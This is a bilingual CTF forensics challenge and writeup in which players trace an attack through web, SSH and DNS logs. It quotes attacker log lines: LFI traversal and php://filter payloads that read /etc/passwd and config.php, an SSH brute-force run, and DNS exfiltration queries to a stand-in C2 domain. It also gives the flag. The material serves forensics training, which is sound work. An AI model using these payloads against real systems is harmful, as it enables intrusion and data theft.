# 🔍 Phantom Trace — CTF Forensics Challenge

---

## 📋 CHALLENGE DESCRIPTION (ENGLISH)

**Name:** Phantom Trace  
**Category:** Forensics — Log Analysis  
**Difficulty:** Medium+  
**Flag Format:** `DWY_YK{...}`  
**Points:** 350

> Our SOC team was alerted to unusual activity on the internal web server at approximately 03:00 UTC on November 15, 2024. By the time we investigated, the attacker had already disconnected. We managed to collect three log files from the incident window.
>
> Something was stolen. Can you trace the attacker's steps and recover what they exfiltrated?

**Files provided:**
- `access.log` — Apache web server access log
- `auth.log` — Linux system authentication log
- `dns_queries.log` — DNS query log captured at the network boundary

**Hints** *(each hint costs points):*
- Hint 1 (−25 pts): Look at what the attacker's User-Agent reveals about their tools.
- Hint 2 (−50 pts): What parameter does the web application use to load pages? What happens when you tamper with it?
- Hint 3 (−75 pts): The attacker didn't use TCP to exfiltrate data. Think about covert channels.

---

## 📋 ĐỀ BÀI (TIẾNG VIỆT)

**Tên:** Phantom Trace (Dấu Vết Ma)  
**Thể loại:** Forensics — Phân Tích Nhật Ký  
**Độ khó:** Medium+  
**Định dạng flag:** `DWY_YK{...}`  
**Điểm:** 350

> Đội SOC của chúng tôi nhận được cảnh báo về hoạt động bất thường trên máy chủ web nội bộ vào khoảng 03:00 UTC ngày 15/11/2024. Khi chúng tôi điều tra, kẻ tấn công đã ngắt kết nối. Chúng tôi thu thập được ba file log trong khoảng thời gian xảy ra sự cố.
>
> Có thứ gì đó đã bị đánh cắp. Bạn có thể truy vết các bước của kẻ tấn công và phục hồi dữ liệu bị lấy cắp không?

**File cung cấp:**
- `access.log` — Nhật ký truy cập của máy chủ web Apache
- `auth.log` — Nhật ký xác thực hệ thống Linux
- `dns_queries.log` — Nhật ký truy vấn DNS ghi lại tại biên mạng

**Gợi ý** *(mỗi gợi ý trừ điểm):*
- Gợi ý 1 (−25 điểm): Nhìn vào User-Agent của kẻ tấn công để biết họ dùng công cụ gì.
- Gợi ý 2 (−50 điểm): Ứng dụng web dùng tham số nào để tải trang? Điều gì xảy ra khi bạn thay đổi nó?
- Gợi ý 3 (−75 điểm): Kẻ tấn công không dùng TCP để lấy dữ liệu. Hãy nghĩ về các kênh ẩn.

---

---

# 📖 WRITEUP / LỜI GIẢI

---

## 🇬🇧 ENGLISH WRITEUP

### Overview

This challenge simulates a real-world post-incident forensic investigation. The attack chain consists of five phases:

```
[Reconnaissance] → [Local File Inclusion] → [SSH Brute-Force]
      → [Privilege Escalation Attempt] → [DNS Exfiltration]
```

Players must correlate evidence across all three log files to reconstruct the timeline and recover the exfiltrated data.

---

### Step 1 — Identifying the Attacker (access.log)

Open `access.log` and look for anomalies. A systematic review reveals several IPs:

| IP              | Behavior                         |
|-----------------|----------------------------------|
| 203.0.113.15    | Normal browsing                  |
| 198.51.100.42   | Normal browsing                  |
| 192.0.2.33      | API automation (legitimate)      |
| 172.16.0.100    | Internal dashboard access        |
| 45.33.32.156    | Internet scanner (zgrab)         |
| **185.220.101.47** | **Suspicious — see below**   |

The IP `185.220.101.47` is immediately suspicious for multiple reasons:

**a) Revealing User-Agents:**
```
"sqlmap/1.7.8#stable (https://sqlmap.org)"
"Nikto/2.1.6"
```
These are well-known offensive security tools — `sqlmap` for SQL injection automation and `Nikto` for web vulnerability scanning. Their presence in production logs is a strong indicator of malicious activity.

**b) Enumeration Pattern:**
The attacker rapidly probed dozens of common sensitive paths in seconds:
```
02:31:23 GET /robots.txt       → 404
02:31:24 GET /admin            → 404
02:31:24 GET /wp-admin         → 404
02:31:25 GET /phpmyadmin       → 404
02:31:25 GET /.env             → 403
02:31:26 GET /.git/config      → 403
02:31:26 GET /.htpasswd        → 403
```
This pattern — many requests in milliseconds — is characteristic of automated scanning, not human browsing.

**c) POST injection attempts:**
```
02:33:11 POST /api/login → 500 (server error — possible injection trigger)
```
A 500 error on a POST to `/api/login` suggests the attacker's payload caused an unhandled server exception. However, this wasn't the successful attack vector.

**Attacker IP: `185.220.101.47`**

---

### Step 2 — The Successful Attack Vector (access.log)

After identifying the IP, filter for requests from `185.220.101.47` and look at the progression:

**Phase 2a — Discovery of the `?page=` parameter:**
The attacker noticed the application uses a `?page=` parameter to include files:
```
02:35:46 GET /index.php?page=contact  → 200 (1874 bytes)
02:35:47 GET /index.php?page=products → 200 (5423 bytes)
```
This means the server is doing something like: `include($_GET['page'] . '.php')` or similar.

**Phase 2b — Local File Inclusion (LFI) attempts:**
```
02:41:33 GET /index.php?page=../etc/passwd          → 400 (blocked)
02:41:44 GET /index.php?page=../../etc/passwd       → 400 (blocked)
02:41:55 GET /index.php?page=../../../etc/passwd    → 400 (blocked)
02:42:07 GET /index.php?page=../../../../etc/passwd → 200 (2817 bytes) ✓
```

**This is the key line:**
```
[15/Nov/2024:02:42:07 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 2817
```

Why is this suspicious?
- The response is **2817 bytes** — far larger than a typical "page not found" response
- The attacker used **4 levels of directory traversal** (`../../../../`) to escape the web root
- A response size of ~2817 bytes is consistent with a real `/etc/passwd` file

This is a **Local File Inclusion (LFI)** vulnerability. The server is reading and serving `/etc/passwd` directly to the attacker.

**Phase 2c — PHP filter wrapper for source code:**
```
02:46:48 GET /index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd → 200 (3791 bytes)
02:47:03 GET /index.php?page=php://filter/convert.base64-encode/resource=config.php  → 200 (892 bytes)
```
The attacker then used PHP stream wrappers to read source code in base64. The `config.php` (892 bytes) likely contained database credentials or application secrets.

**The `/etc/passwd` file content reveals a username: `backup_svc`**
(This is inferable because the attacker later specifically targets this user via SSH)

---

### Step 3 — SSH Brute Force and Login (auth.log)

Now pivot to `auth.log`. Search for the attacker's IP: `185.220.101.47`

**Timeline in auth.log:**

```
03:01:22  Failed password for root          (port 44101)
03:01:23  Failed password for root          (port 44102)
03:01:24  Failed password for admin         (port 44103)
...
03:01:37  Failed password for devops        (port 44117)
03:01:38  Failed password for devops        (port 44118)
03:01:39  Failed password for devops        (port 44119)
...
03:05:41  Failed password for backup_svc    (port 44151)
03:05:55  Failed password for backup_svc    (port 44152)
...
03:08:10  Failed password for backup_svc    (port 44162)
03:08:44  Accepted password for backup_svc  (port 44163) ← SUCCESS
```

**Key observations:**
1. The attack begins at `03:01` — about 19 minutes after the LFI success at `02:42`
2. The attacker tries common usernames first (root, admin, devops...) then pivots to `backup_svc`
3. The username `backup_svc` was discovered from the `/etc/passwd` dump via LFI
4. After 12 failed attempts specifically against `backup_svc`, the login succeeds at **03:08:44**

```
Nov 15 03:08:44 webserver sshd[2863]: Accepted password for backup_svc from 185.220.101.47 port 44163 ssh2
Nov 15 03:08:44 webserver sshd[2863]: pam_unix(sshd:session): session opened for user backup_svc
```

**After login, there's a very interesting sudo entry:**
```
03:09:14  sudo: backup_svc ran: /usr/bin/python3 /home/backup_svc/.config/sync.py
```
The attacker ran a Python script called `sync.py` from a hidden config directory. This is the exfiltration script.

---

### Step 4 — DNS Exfiltration Detection (dns_queries.log)

Open `dns_queries.log`. Filter for entries after `03:08:44` (the SSH login time).

Among normal-looking DNS queries (`api.stripe.com`, `smtp.mailgun.org`, etc.), at `03:12` several anomalous entries appear:

```
03:12:08  seq-4.bF92MTRf.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:09  seq-1.RFdZX1lL.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:10  seq-6.X0NsM3Yz.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:11  seq-2.e1MxbDNu.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:13  seq-7.ciF9.exfil.redteam-c2.xyz       → NXDOMAIN
03:12:14  seq-5.RE41XzFz.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:15  seq-3.dF8zeGYx.exfil.redteam-c2.xyz  → NXDOMAIN
```

**Why is this DNS exfiltration?**

1. **Domain pattern**: `*.exfil.redteam-c2.xyz` — the subdomain name `exfil` (exfiltrate) and `c2` (Command & Control) are strong red flags
2. **NXDOMAIN responses**: The domain doesn't actually resolve — it doesn't need to. The attacker's C2 server is monitoring DNS queries at the authoritative nameserver, so the data is received even without a DNS response
3. **Chunked sequential data**: Subdomains are named `seq-N.DATA...` — sequentially numbered data chunks
4. **Base64-looking strings**: `bF92MTRf`, `RFdZX1lL`, etc. — these are base64-encoded data
5. **Shuffled order**: The chunks arrive out of order (seq-4, seq-1, seq-6, seq-2...) — a common technique to evade simple sequential pattern detection

---

### Step 5 — Decoding the Exfiltrated Data

**5a — Extract and sort the chunks:**

The queries arrive shuffled. Sort by the `seq-N` prefix:

| Seq | Base64 Chunk |
|-----|-------------|
| 1   | `RFdZX1lL` |
| 2   | `e1MxbDNu` |
| 3   | `dF8zeGYx` |
| 4   | `bF92MTRf` |
| 5   | `RE41XzFz` |
| 6   | `X0NsM3Yz` |
| 7   | `ciF9`     |

**5b — Concatenate:**
```
RFdZX1lLe1MxbDNudF8zeGYxbF92MTRfRE41XzFzX0NsM3YzciF9
```

**5c — Decode base64:**
```python
import base64
data = "RFdZX1lLe1MxbDNudF8zeGYxbF92MTRfRE41XzFzX0NsM3YzciF9"
print(base64.b64decode(data).decode())
```

Output:
```
DWY_YK{S1l3nt_3xf1l_v14_DN5_1s_Cl3v3r!}
```

**🚩 FLAG: `DWY_YK{S1l3nt_3xf1l_v14_DN5_1s_Cl3v3r!}`**

*(Translation: "Silent exfil via DNS is Clever!")*

---

### Attack Timeline Summary

| Time (UTC)  | Event                                                      | Log File       |
|-------------|-------------------------------------------------------------|----------------|
| 02:31       | Attacker begins automated scanning with sqlmap/Nikto       | access.log     |
| 02:33       | Attempted SQL injection on `/api/login` (failed, 500 err)  | access.log     |
| 02:35       | Discovers `?page=` parameter via Nikto                     | access.log     |
| 02:41–02:42 | LFI traversal attempts; **success at depth 4** (2817 bytes) | access.log    |
| 02:46–02:47 | PHP filter wrapper reads passwd + config.php source        | access.log     |
| 03:01–03:08 | SSH brute-force against 15+ usernames from /etc/passwd      | auth.log       |
| **03:08:44**| **SSH login success as `backup_svc`**                      | auth.log       |
| 03:09:14    | Attacker runs `sync.py` (exfil script) via sudo            | auth.log       |
| 03:12:08–15 | **DNS exfiltration** — 7 base64 chunks to redteam-c2.xyz   | dns_queries.log|

---

### Forensic Techniques Used

- **Log correlation**: Connecting evidence across web, SSH, and DNS logs by timestamps and IP addresses
- **Anomaly detection in access.log**: Volume anomalies, suspicious User-Agents, directory traversal patterns, abnormal response sizes
- **LFI identification**: Recognizing directory traversal (`../../../`) and PHP stream wrapper attacks
- **Brute-force pattern recognition**: Sequential port increments, same source IP, many failed → one success
- **DNS exfiltration analysis**: Identifying covert data channels in DNS subdomains (NXDOMAIN responses, base64 subdomains, C2 naming)
- **Sequence reassembly**: Sorting shuffled chunks and base64 decoding

---

---

## 🇻🇳 LỜI GIẢI (TIẾNG VIỆT)

### Tổng Quan

Challenge này mô phỏng một cuộc điều tra pháp chứng số (digital forensics) sau sự cố thực tế. Chuỗi tấn công gồm 5 giai đoạn:

```
[Trinh sát] → [Local File Inclusion] → [Tấn công SSH]
     → [Leo thang đặc quyền] → [Rò rỉ dữ liệu qua DNS]
```

Người chơi phải liên kết bằng chứng từ cả ba file log để dựng lại timeline và phục hồi dữ liệu bị lấy cắp.

---

### Bước 1 — Xác Định IP Kẻ Tấn Công (access.log)

Mở `access.log`, xem qua các IP xuất hiện. Trong số đó, `185.220.101.47` nổi bật vì:

**a) User-Agent công khai công cụ tấn công:**
```
"sqlmap/1.7.8#stable (https://sqlmap.org)"   ← tool tự động tấn công SQL
"Nikto/2.1.6"                                ← tool scan lỗ hổng web
```
Đây là các công cụ offensive security phổ biến. Sự xuất hiện của chúng trong log sản xuất là dấu hiệu rõ ràng của hoạt động độc hại.

**b) Mô hình quét tự động:**
Hàng chục request đến các đường dẫn nhạy cảm trong vài giây:
```
/admin, /wp-admin, /phpmyadmin, /.env, /.git/config, /.htpasswd ...
```
Mô hình này (nhiều request trong mili-giây) đặc trưng của công cụ tự động, không phải người dùng thực.

**c) Lỗi 500 trên POST /api/login:**
```
02:33:11 POST /api/login → 500
```
Lỗi server 500 do payload của kẻ tấn công — gợi ý thử injection nhưng không thành công.

**Kết quả: IP kẻ tấn công = `185.220.101.47`**

---

### Bước 2 — Lỗ Hổng LFI và Dữ Liệu Bị Lộ (access.log)

Lọc các request từ `185.220.101.47`, theo dõi sự tiến triển:

**Kẻ tấn công phát hiện tham số `?page=`:**
```
/index.php?page=about    → 200
/index.php?page=contact  → 200
```
Ứng dụng dùng `?page=` để include file (có thể là `include($_GET['page'])` trong PHP).

**Các lần thử LFI (Local File Inclusion):**
```
02:41:33  ?page=../etc/passwd         → 400 (thất bại)
02:41:44  ?page=../../etc/passwd      → 400 (thất bại)
02:41:55  ?page=../../../etc/passwd   → 400 (thất bại)
02:42:07  ?page=../../../../etc/passwd → 200 (2817 bytes) ✅ THÀNH CÔNG!
```

**Dòng quan trọng nhất trong access.log:**
```
[15/Nov/2024:02:42:07] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 2817
```

Tại sao đây là dấu hiệu tấn công thành công?
- Response **200 OK** (không phải lỗi)
- Kích thước **2817 bytes** — đúng kích thước điển hình của file `/etc/passwd`
- Traversal **4 cấp** (`../../../../`) — vượt ra khỏi web root để đến `/etc/passwd`

Từ file `/etc/passwd` bị lộ, kẻ tấn công tìm được username **`backup_svc`** (suy ra từ hành động tiếp theo trong auth.log).

Kẻ tấn công tiếp tục dùng PHP filter wrapper để đọc source code:
```
02:46:48  php://filter/convert.base64-encode/resource=/etc/passwd  → 200 (3791 bytes)
02:47:03  php://filter/convert.base64-encode/resource=config.php   → 200 (892 bytes)
```
File `config.php` (892 bytes) khả năng chứa credential database.

---

### Bước 3 — Tấn Công SSH Brute-Force (auth.log)

Chuyển sang `auth.log`, lọc theo IP `185.220.101.47`:

**Quá trình brute-force:**
```
03:01:22  Sai mật khẩu: root
03:01:24  Sai mật khẩu: admin
03:01:25  User không tồn tại: administrator
03:01:26  User không tồn tại: ubuntu
...
03:05:41  Sai mật khẩu: backup_svc  ← bắt đầu nhắm mục tiêu
03:05:55  Sai mật khẩu: backup_svc
...
03:08:44  ✅ Accepted password for backup_svc ← ĐĂNG NHẬP THÀNH CÔNG
```

**Quan sát quan trọng:**
1. Kẻ tấn công bắt đầu thử `backup_svc` ở `03:05` — sau khi đọc `/etc/passwd` lúc `02:42`
2. Sau 12 lần thất bại với `backup_svc`, đăng nhập thành công lúc **03:08:44**
3. Ngay sau đó: `03:09:14` — chạy script Python `/home/backup_svc/.config/sync.py` qua sudo

Entry đặc biệt quan trọng:
```
Nov 15 03:09:14 webserver sudo[2872]: backup_svc : TTY=pts/1 ; PWD=/home/backup_svc ;
  USER=root ; COMMAND=/usr/bin/python3 /home/backup_svc/.config/sync.py
```
Script `sync.py` ẩn trong `.config/` (thư mục ẩn) là công cụ exfiltration.

---

### Bước 4 — Phát Hiện DNS Exfiltration (dns_queries.log)

Mở `dns_queries.log`, lọc các entry sau `03:08:44`.

Giữa các query DNS bình thường (`api.stripe.com`, `smtp.mailgun.org`, ...), xuất hiện các query bất thường lúc `03:12`:

```
03:12:08  seq-4.bF92MTRf.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:09  seq-1.RFdZX1lL.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:10  seq-6.X0NsM3Yz.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:11  seq-2.e1MxbDNu.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:13  seq-7.ciF9.exfil.redteam-c2.xyz       → NXDOMAIN
03:12:14  seq-5.RE41XzFz.exfil.redteam-c2.xyz  → NXDOMAIN
03:12:15  seq-3.dF8zeGYx.exfil.redteam-c2.xyz  → NXDOMAIN
```

**Tại sao đây là DNS exfiltration?**

1. **Tên miền đáng ngờ**: `exfil.redteam-c2.xyz` — "exfil" (exfiltrate = rò rỉ dữ liệu) và "c2" (Command & Control)
2. **NXDOMAIN**: Domain không tồn tại — nhưng không cần! Server C2 của kẻ tấn công theo dõi query ở nameserver, dữ liệu được nhận ngay cả khi không có response
3. **Dữ liệu trong subdomain**: `seq-N.DATA.domain` — dữ liệu được nhúng vào subdomain
4. **Chuỗi Base64**: `bF92MTRf`, `RFdZX1lL` — trông giống base64 (chỉ gồm ký tự A-Z, a-z, 0-9)
5. **Thứ tự xáo trộn**: seq-4, seq-1, seq-6, seq-2... — gửi không theo thứ tự để qua mặt hệ thống phát hiện đơn giản

---

### Bước 5 — Giải Mã Dữ Liệu Bị Đánh Cắp

**5a — Trích xuất và sắp xếp chunks theo số thứ tự:**

| Seq | Base64 Chunk |
|-----|-------------|
| 1   | `RFdZX1lL` |
| 2   | `e1MxbDNu` |
| 3   | `dF8zeGYx` |
| 4   | `bF92MTRf` |
| 5   | `RE41XzFz` |
| 6   | `X0NsM3Yz` |
| 7   | `ciF9`     |

**5b — Nối chuỗi:**
```
RFdZX1lLe1MxbDNudF8zeGYxbF92MTRfRE41XzFzX0NsM3YzciF9
```

**5c — Giải mã Base64:**
```python
import base64
data = "RFdZX1lLe1MxbDNudF8zeGYxbF92MTRfRE41XzFzX0NsM3YzciF9"
print(base64.b64decode(data).decode())
# Output: DWY_YK{S1l3nt_3xf1l_v14_DN5_1s_Cl3v3r!}
```

**🚩 FLAG: `DWY_YK{S1l3nt_3xf1l_v14_DN5_1s_Cl3v3r!}`**

*(Dịch: "Rò rỉ dữ liệu âm thầm qua DNS thật thông minh!")*

---

### Timeline Tổng Kết

| Thời gian (UTC) | Sự kiện                                              | File Log        |
|-----------------|------------------------------------------------------|-----------------|
| 02:31           | Bắt đầu quét tự động với sqlmap/Nikto                | access.log      |
| 02:33           | Thử SQL injection vào `/api/login` (thất bại)        | access.log      |
| 02:35           | Phát hiện tham số `?page=` qua Nikto                 | access.log      |
| 02:41–02:42     | Thử LFI; **thành công ở độ sâu 4** (2817 bytes)     | access.log      |
| 02:46–02:47     | PHP filter đọc source `/etc/passwd` + `config.php`   | access.log      |
| 03:01–03:08     | SSH brute-force 15+ usernames từ /etc/passwd          | auth.log        |
| **03:08:44**    | **Đăng nhập SSH thành công với `backup_svc`**        | auth.log        |
| 03:09:14        | Chạy script `sync.py` (exfil script) qua sudo        | auth.log        |
| 03:12:08–15     | **DNS exfiltration** — 7 chunk base64 đến c2.xyz     | dns_queries.log |

---

### Kỹ Thuật Pháp Chứng Số Sử Dụng

- **Tương quan log (Log correlation)**: Liên kết bằng chứng giữa log web, SSH, DNS theo timestamp và IP
- **Phát hiện bất thường trong access.log**: Tần suất request cao bất thường, User-Agent độc hại, mô hình directory traversal, kích thước response bất thường
- **Nhận diện LFI**: Phân biệt traversal (`../../../`) và PHP stream wrapper attack
- **Nhận diện brute-force**: Port tăng tuần tự, cùng IP nguồn, nhiều thất bại → một lần thành công
- **Phân tích DNS exfiltration**: Nhận diện kênh dữ liệu ẩn trong DNS subdomain (NXDOMAIN, base64 subdomain, đặt tên C2)
- **Tái lắp ghép dữ liệu**: Sắp xếp chunk theo thứ tự và giải mã Base64

---

*Challenge designed for educational purposes in CTF forensics training.*
